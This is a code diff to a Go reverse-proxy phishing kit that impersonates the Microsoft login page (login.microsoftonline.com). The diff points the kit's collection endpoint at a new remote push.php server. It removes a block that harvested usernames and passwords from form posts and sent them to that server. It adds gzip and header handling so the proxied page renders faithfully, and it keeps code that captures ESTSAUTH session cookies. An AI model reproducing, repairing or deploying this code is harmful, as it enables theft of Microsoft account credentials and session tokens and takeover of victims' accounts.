@@ -1,9 +1,11 @@
 package main
 
 import (
+    "compress/gzip"
     "crypto/rand"
     "encoding/base64"
     "fmt"
+    "io"
     "io/ioutil"
     "net/http"
     "os"
@@ -14,7 +16,7 @@ import (
 const (
     upstream        = "login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://rest.westmidlands-ush.shop/neronewms/push.php"
+    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php" // Updated server URL
 )
 
 // Variables for blocking regions and IP addresses
@@ -78,24 +80,6 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     req.Header.Set("Host", upstream)
     req.Header.Set("Referer", r.Referer())
 
-    if r.Method == "POST" {
-        r.ParseForm()
-        var message strings.Builder
-        message.WriteString("Password found:\n\n")
-        for key, values := range r.PostForm {
-            value := values[0]
-            if key == "login" {
-                message.WriteString("User: " + value + "\n")
-            }
-            if key == "passwd" {
-                message.WriteString("Password: " + value + "\n")
-            }
-        }
-        if strings.Contains(message.String(), "User") && strings.Contains(message.String(), "Password") {
-            sendToServer(message.String(), ipAddress)
-        }
-    }
-
     client := &http.Client{}
     resp, err := client.Do(req)
     if err != nil {
@@ -104,10 +88,34 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
     defer resp.Body.Close()
 
+    // Handle gzip encoding if present
+    var reader io.ReadCloser
+    switch resp.Header.Get("Content-Encoding") {
+    case "gzip":
+        reader, err = gzip.NewReader(resp.Body)
+        if err != nil {
+            http.Error(w, "Failed to decode gzip content", http.StatusInternalServerError)
+            return
+        }
+        defer reader.Close()
+        w.Header().Set("Content-Encoding", "gzip")
+    default:
+        reader = resp.Body
+    }
+
+    // Copy relevant headers from the upstream response
+    for k, v := range resp.Header {
+        if k != "Content-Encoding" && k != "Content-Length" {
+            for _, vv := range v {
+                w.Header().Add(k, vv)
+            }
+        }
+    }
+
     // Extract and modify cookies
     allCookies := extractAndModifyCookies(resp, w)
 
-    bodyBytes, _ := ioutil.ReadAll(resp.Body)
+    bodyBytes, _ := ioutil.ReadAll(reader)
     bodyString := strings.ReplaceAll(string(bodyBytes), upstream, r.Host)
 
     if strings.Contains(allCookies, "ESTSAUTH") && strings.Contains(allCookies, "ESTSAUTHPERSISTENT") {
